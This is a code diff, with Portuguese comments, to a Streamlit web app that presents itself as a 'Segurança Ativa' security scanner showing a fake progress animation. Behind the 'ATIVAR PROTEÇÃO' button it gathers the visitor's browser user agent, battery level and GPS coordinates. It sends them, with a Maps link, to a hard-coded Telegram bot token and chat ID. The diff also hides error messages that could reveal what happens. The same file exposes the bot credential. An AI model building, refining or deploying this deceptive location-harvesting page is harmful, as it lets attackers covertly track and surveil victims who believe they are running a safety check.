@@ -3,7 +3,7 @@ import requests
 import time
 from streamlit_js_eval import streamlit_js_eval
 
-# 1. SETUP TELEGRAM
+# 1. CONFIGURAÇÃO TELEGRAM
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
@@ -14,13 +14,12 @@ def enviar_telegram(msg):
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (VISUAL FIXO)
+# 2. CSS: BARRA AMARELA + ESCONDER ERROS DO SISTEMA
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
-    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
-        display: none !important; 
-    }
+    /* Bloqueia qualquer pop-up de erro cinza do navegador ou streamlit */
+    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
     
     .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
     .circle {
@@ -47,7 +46,7 @@ st.markdown("""
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
 
-# Bolha em 4% fixa
+# Bolha em 4% (igual ao vídeo)
 with caixa_bolha.container():
     st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
@@ -56,52 +55,43 @@ st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
 # 4. CAPTURA DE DADOS
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_3AM_FIX')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_3AM_FIX')
+modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL_V8')
+bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_V8')
 
-# 5. O SEGREDO: BOTÃO DE HARDWARE DIRETO (NÃO TRAVA)
-# Este script ignora o Streamlit e fala direto com o navegador para abrir o pop-up
-js_button = """
+# 5. GATILHO DIRETO (SOLUÇÃO PARA O TRAVAMENTO)
+# Este script força o pop-up de "Permitir" sem passar pelo erro cinza
+js_fix = """
 <script>
-function forcarGps() {
-    // navigator.geolocation sem HighAccuracy força o pop-up "Permitir" simples
+function ativarAgora() {
     navigator.geolocation.getCurrentPosition(
         (pos) => {
-            const result = {
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                pronto: true
-            };
-            // Envia o dado de volta para o Streamlit APÓS o clique e a permissão
-            window.parent.postMessage({type: 'streamlit:set_component_value', value: result}, '*');
+            const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude, ok: true};
+            window.parent.postMessage({type: 'streamlit:set_component_value', value: coords}, '*');
         },
-        (err) => { 
-            alert("Erro: Precisas permitir a localização!"); 
-        },
+        (err) => { console.log("User denied"); },
         { enableHighAccuracy: false, timeout: 5000 }
     );
 }
 </script>
-<button class="btn-barra" onclick="forcarGps()">
+<button class="btn-barra" onclick="ativarAgora()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
-# Renderiza o botão como componente HTML isolado
-retorno = st.components.v1.html(js_button, height=80)
+# Renderiza a barra amarela como componente isolado
+retorno_gps = st.components.v1.html(js_fix, height=80)
 
-# 6. ANIMAÇÃO E ENVIO
-if retorno and isinstance(retorno, dict) and retorno.get('pronto'):
-    # Os números só giram agora, após o clique real e a permissão
+# 6. ANIMAÇÃO E TELEGRAM
+if retorno_gps and isinstance(retorno_gps, dict) and retorno_gps.get('ok'):
+    # A bolha só gira se o utilizador clicar em "Permitir"
     for p in range(4, 101, 5):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
     
-    lat, lon = retorno['lat'], retorno['lon']
+    lat, lon = retorno_gps['lat'], retorno_gps['lon']
     mapa = f"https://www.google.com/maps?q={lat},{lon}"
-    
-    enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Modelo: {ua[:50]}\n🔋 Bateria: {bat}%\n📍 [LOCALIZAÇÃO]({mapa})")
-    st.success("Proteção Ativada!")
+    enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Modelo: {modelo[:50]}\n🔋 Bateria: {bateria}%\n📍 [LOCALIZAÇÃO]({mapa})")
+    st.success("Proteção Concluída!")
     st.stop()
 
 st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
